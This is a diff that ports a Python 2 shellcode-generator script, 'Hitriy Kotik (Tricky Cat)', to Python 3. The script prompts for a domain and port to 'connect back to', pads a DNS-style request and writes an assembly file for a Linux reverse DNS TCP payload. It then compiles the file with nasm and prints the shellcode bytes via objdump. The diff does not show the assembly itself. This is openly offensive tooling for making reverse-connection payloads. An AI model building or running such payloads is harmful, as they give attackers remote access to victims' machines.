@@ -5,7 +5,7 @@ import os
 import subprocess
 import platform
 
-print """ 
+print (""" 
 ; ccccccccclllllllloooooooooodddddddddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdl:;',cdxddxdxxddddddddddddoooooooooolllllllllccccccc
 ; ccccccllllllllloooooooodddddddddddddxxxxxxxxxxxxxddxxkxxxxxxkkkkxxxxxxxxxxxxxxxxxxxxkxxxxkkxxxxdc,......:dxdxxxxdxddddddddddddddooooooooollllllllccccc
 ; ccccllllllllooooooooddddddddddddxxxxxxxxxxxxxxxxo;'';coxkkkkxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,.....'..'oxxxxxxxxxxxxdddddddddddooooooooooolllllllccc
@@ -50,19 +50,19 @@ print """
 ; ; Author : Krash clllllllllloooooooooooooodddddl;'''........                               ...........''''','''''''''.',:clollllllllllcccccccc:cc:::::
 
 
-"""
+""")
 
 
 
-print "Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n\n\
-!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n\nTell Me , a few things and I will generate the shellcode for you!"  
+print ("Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n\n\
+!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n\nTell Me , a few things and I will generate the shellcode for you!")  
 
 
-domainname = raw_input("[+] Tell Me The Domain You wish To Connect Back To : ")
-LPort      = raw_input("[+] Tell Me The Port   You Wish To Connect Back To : ")
+domainname = input("[+] Tell Me The Domain You wish To Connect Back To : ")
+LPort      = input("[+] Tell Me The Port   You Wish To Connect Back To : ")
 
 if platform.system() == 'Windows':
-    print "[-] I Need To Warn you That You'll Need Some Additional Tools To Use My Magic...\n Make Sure You Have nasm, objdump , and gcc installed \n"
+    print ("[-] I Need To Warn you That You'll Need Some Additional Tools To Use My Magic...\n Make Sure You Have nasm, objdump , and gcc installed \n")
 
 Prefix       = ['AA', 'AA' ,'01', '00','00', '01' ,'00','00','00','00','00','00']
 DomainSize   = []
@@ -82,16 +82,16 @@ lengthOfPayload = 22 + len(domainname.replace(".",""))
 
 if (lengthOfPayload  % 4) == 0:
     #pass
-    print "[+] Everything looks good!\n"
+    print ("[+] Everything looks good!\n")
 elif (lengthOfPayload  % 4) == 3:
-    print "[-] Padding With A Byte \n"
+    print ("[-] Padding With A Byte \n")
     Suffix.append('00')
 elif (lengthOfPayload  % 4) == 2:
-    print "[-] Padding With 2  Bytes \n"
+    print ("[-] Padding With 2  Bytes \n")
     Suffix.append('00')
     Suffix.append('00')
 elif (lengthOfPayload  % 4) == 1:
-    print "[-] Padding With 3  Bytes \n"
+    print ("[-] Padding With 3  Bytes \n")
     Suffix.append('00')
     Suffix.append('00')
     Suffix.append('00')
@@ -495,36 +495,36 @@ main:
 
 """.format(PrintableEndianRequest, encodedport)
 
-print "[+] I Am Making Your PayLoad Right Now...."
+print ("[+] I Am Making Your PayLoad Right Now....")
 f = open("hitriykotik.asm", "w+")
 f.write(PayLOAD)
-print "[+] ASM Created Successfully...."
+print ("[+] ASM Created Successfully....")
 f.close()
 
 
 try:
-    print "[+] Nasm Compiling........"
+    print ("[+] Nasm Compiling........")
     os.system("nasm -f elf -o hitriykotik.o hitriykotik.asm")  # old and deprecated, it works though....
 except OSError as e:
     if e.errno == os.errno.ENOENT:
-        print "[-] Something Went Wrong , Do You Have Nasm Installed? \n"
+        print ("[-] Something Went Wrong , Do You Have Nasm Installed? \n")
         sys.exit(1)
     else:
-        print "[-] Something Went Wrong , I Think Something Broke Using Nasm...\n"
+        print ("[-] Something Went Wrong , I Think Something Broke Using Nasm...\n")
         sys.exit(1)
         raise
 
 try:
-    print "[+] Objdumping........\n\n"
+    print ("[+] Objdumping........\n\n")
     objdump = 'for i in $(objdump -d hitriykotik.o | tr "\t" " " | tr " " "\n" | grep -E "^[0-9a-f]{2}$" ) ; do echo -n "\\x$i" ; done'
     os.system(objdump)
-    print "\n"
+    print ("\n")
     
 except OSError as e:
     if e.errno == os.errno.ENOENT:
-         print "[-] Something Went Wrong , Do You Have Objdump Installed?"
+         print ("[-] Something Went Wrong , Do You Have Objdump Installed?")
          sys.exit(1)
     else:
-        print "[-] Something Went Wrong , I Think Something Broke Using Objdump..."
+        print ("[-] Something Went Wrong , I Think Something Broke Using Objdump...")
         sys.exit(1)
         raise
